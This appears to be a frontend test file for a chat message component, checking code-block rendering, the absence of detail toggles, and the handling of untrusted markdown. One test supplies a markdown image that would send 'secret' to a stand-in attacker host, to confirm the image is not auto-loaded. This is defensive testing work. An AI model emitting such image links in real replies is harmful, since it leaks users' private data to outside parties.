import { describe, it, expect } from 'vitest'

describe('ChatMessageBubble — code blocks and the absence of always-on details', () => {
  it('wraps fenced code in a block with a language label and Copy button', async () => {
    const { render } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    const { container } = render(<ChatMessageBubble role="assistant" content={'```bash\nls -la\n```'} />)
    expect(container.querySelector('.bubble__code-lang')?.textContent).toBe('bash')
    expect(container.querySelector('button[aria-label="Copy code"]')).toBeTruthy()
  })

  it('shows no Details row, Why? or Run detail toggles: explanations appear only when asked for (/why etc.)', async () => {
    const { render, screen } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    render(<ChatMessageBubble role="assistant" content="hi" />)
    expect(screen.queryByRole('group', { name: 'Details' })).toBeNull()
    expect(screen.queryByRole('button', { name: 'Why?' })).toBeNull()
    expect(screen.queryByRole('button', { name: /Run detail/ })).toBeNull()
  })
})

describe('ExplainBubble', () => {
  it('shows the command and its lines as plain text', async () => {
    const { render, screen } = await import('@testing-library/react')
    const { ExplainBubble } = await import('./ChatMessageBubble')
    render(<ExplainBubble command="/sources" lines={['- Read a.md', '- Fetched https://x.test (external)']} />)
    expect(screen.getByText('/sources')).toBeTruthy()
    expect(screen.getByTestId('explain-bubble').textContent).toContain('- Read a.md\n- Fetched https://x.test (external)')
  })
})

describe('ChatMessageBubble — untrusted markdown', () => {
  it('does not render an auto-loading image and opens links without navigating the app window', async () => {
    const { render } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    const { container } = render(
      <ChatMessageBubble role="assistant" content={'![x](https://evil.example/?q=secret) [go](https://example.com)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('image not loaded')
    const link = container.querySelector('a')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toContain('noopener')
  })
})
